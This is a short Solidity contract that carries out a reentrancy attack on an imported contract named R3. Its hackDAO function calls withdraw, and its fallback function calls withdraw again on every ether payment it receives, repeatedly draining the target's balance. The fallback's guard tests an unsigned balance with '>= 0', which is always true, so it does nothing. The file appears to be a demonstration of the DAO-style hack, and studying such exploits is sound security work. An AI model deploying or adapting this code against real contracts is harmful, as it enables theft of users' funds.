pragma solidity ^0.5.0;
import "./R3.sol";

contract R3A{
    R3 public r3;
    
    constructor(address payable _contractAddress) public payable{
        r3 = R3(_contractAddress);
    }
    
    function sendEthToDAO() public {
        address(r3).call.value(address(this).balance)("");
    }
    
    function hackDAO() public{
        r3.withdraw();
    }
    
    function() external payable{
        if(address(r3).balance >= 0){
            r3.withdraw();
        }

        
    }
    
    function getDAOBalance() public view returns(uint){
        return address(r3).balance;
    }
}